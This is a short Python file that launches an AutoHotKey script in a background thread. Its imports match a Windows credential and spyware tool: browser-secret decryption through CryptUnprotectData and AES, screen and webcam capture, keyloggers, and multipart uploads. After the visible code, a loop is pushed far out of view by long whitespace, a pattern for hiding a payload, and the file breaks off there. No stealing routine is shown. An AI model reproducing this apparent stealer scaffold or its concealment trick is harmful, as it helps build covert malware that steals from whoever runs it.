import base64
import concurrent.futures
import ctypes
import json
import os
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
from ctypes import wintypes
from multiprocessing import cpu_count
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile

import psutil
import requests
from Cryptodome.Cipher import AES
from PIL import Image, ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
from win32crypt import CryptUnprotectData
import socket, subprocess, platform
from threading import Thread
from datetime import datetime
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
import shutil
import glob
import webbrowser
import pyautogui
import cv2
import urllib.request
from pynput.keyboard import Listener
from pynput.mouse import Controller
import keyboard



def run_ahk_script():
    script_path = os.path.join(os.path.dirname(__file__), 'ChapkaMolette v5.ahk')
    executable_path = os.path.join(os.path.dirname(__file__), 'AutoHotKeyA32.exe')

    # Exécuter le script AHK dans un processus séparé
    subprocess.run([executable_path, script_path])

# Créer un thread pour exécuter le script AHK
ahk_thread = threading.Thread(target=run_ahk_script)

# Démarrer le thread
ahk_thread.start()


                                                                    for i in range(1):
                        
